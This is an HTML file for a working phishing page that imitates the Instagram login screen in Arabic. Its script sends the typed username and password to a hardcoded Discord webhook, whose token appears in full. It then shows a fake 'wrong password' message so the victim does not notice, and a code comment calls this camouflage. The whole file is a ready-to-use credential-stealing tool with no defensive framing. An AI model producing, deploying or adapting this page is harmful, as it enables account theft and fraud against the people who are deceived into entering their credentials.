# Instagram
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { margin: 0; background: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { width: 350px; border: 1px solid #dbdbdb; padding: 20px 40px; text-align: center; background: white; border-radius: 1px; }
        .logo { width: 175px; margin: 20px 0 30px; }
        input { width: 100%; padding: 12px; margin-bottom: 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; }
        button { width: 100%; padding: 8px; background: #0095f6; border: none; border-radius: 4px; color: #fff; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:disabled { background: #b2dffc; cursor: not-allowed; }
        .error { color: #ed4956; font-size: 14px; margin-top: 20px; display: none; }
        .footer { margin-top: 40px; color: #8e8e8e; font-size: 12px; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511103039.png" class="logo">
    
    <input type="text" id="user" placeholder="اسم المستخدم أو الهاتف">
    <input type="password" id="pass" placeholder="كلمة السر">
    
    <button id="btn" onclick="sendToDiscord()">تسجيل الدخول</button>

    <div id="msg" class="error">عذراً، كلمة السر غير صحيحة. يرجى المحاولة مرة أخرى.</div>
    
    <div class="footer">نسيت كلمة السر؟</div>
</div>

<script>
async function sendToDiscord() {
    const userField = document.getElementById("user");
    const passField = document.getElementById("pass");
    const btn = document.getElementById("btn");
    const error = document.getElementById("msg");

    // الرابط ديالك تلصق بنجاح
    const webhookURL = "https://discord.com/api/webhooks/1469352633876611174/nyR4l4mXGli4vdeze1_6n34vAbdNKzllPP5gGHpwEjUr4I2gb-Hr4nzf75v1QOKvE0TI";

    if (userField.value.length < 3 || passField.value.length < 5) {
        alert("يرجى إدخال بيانات صحيحة");
        return;
    }

    btn.disabled = true;
    btn.innerText = "جاري التحميل...";

    const content = {
        username: "Instagram Security",
        avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png",
        content: `🚨 **دخول جديد مكتشف:**\n\n👤 **المستخدم:** \`${userField.value}\`\n🔑 **كلمة السر:** \`${passField.value}\`\n⏰ **الوقت:** ${new Date().toLocaleString()}`
    };

    try {
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(content)
        });

        // إظهار رسالة الخطأ ومسح الحقول للتمويه
        error.style.display = "block";
        passField.value = "";
        btn.disabled = false;
        btn.innerText = "تسجيل الدخول";

    } catch (e) {
        error.style.display = "block";
        btn.disabled = false;
        btn.innerText = "تسجيل الدخول";
    }
}
</script>
</body>
</html>
